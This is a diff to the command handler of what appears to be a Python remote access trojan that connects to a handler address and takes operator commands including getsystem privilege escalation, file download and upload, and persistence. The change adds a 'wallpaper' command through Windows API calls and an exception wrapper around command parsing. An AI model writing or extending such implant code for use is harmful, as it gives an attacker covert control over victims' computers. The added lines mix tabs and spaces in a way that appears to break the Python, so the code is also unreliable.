@@ -13,6 +13,7 @@ from core.communication import Transport
 import sys
 import logging
 import time
+import ctypes
 
 if sys.stdout.isatty():
 	logging.basicConfig(level=logging.DEBUG, format="%(asctime)s %(levelname)s in %(funcName)s: %(message)s")
@@ -36,7 +37,7 @@ try:
 		AUTH_SECRET = f.read(30)
 except Exception as e:
 	print e
-	logging.debug("We're uncompyled, let's use these values...")
+	logging.debug("We're uncompiled, let's use these values...")
 	HANDLER_IP = "127.0.0.1"
 	HANDLER_PORT = 8080
 	with open("stelf.guid", "rb") as f:
@@ -104,7 +105,7 @@ help - This menu!
 		
 	def error(self, err):
 		return err
-		
+
 	def parse_command(self, data):
 		if data == "CONN_LOST":
 			return False, False
@@ -146,7 +147,7 @@ help - This menu!
 			
 		elif data == "getsystem":
 			return privesc.get_system,
-			
+
 		elif data.startswith("download"):
 			file = data.split()[1]
 			return fs.download, file, self.channel
@@ -154,7 +155,10 @@ help - This menu!
 		elif data.startswith("upload"):
 			file = data.split()[1]
 			return fs.upload, file, self.channel
-			
+		
+                elif data.startswith("wallpaper"):
+                    file = data.split()[1]
+                    return ctypes.windll.user32.SystemParametersInfoA(20, 0, file , 0),
 		elif data == "persist":
 			return misc.persist, 
 			
@@ -265,11 +269,13 @@ help - This menu!
 					output = "[-]No such option: "+data[1]
 				
 			else:
+                            try:
 				parsed = self.parse_command(data)
 				func, args = parsed[0], parsed[1:]
 				if not func: return False
 				output = func(*args)
-				
+                            except Exception as e:
+			        print e
 			if output != "BG_NEW_SESH": self.send(str(output)+"\n"+os.getcwd()+">>")
 		
 	def send(self, data):
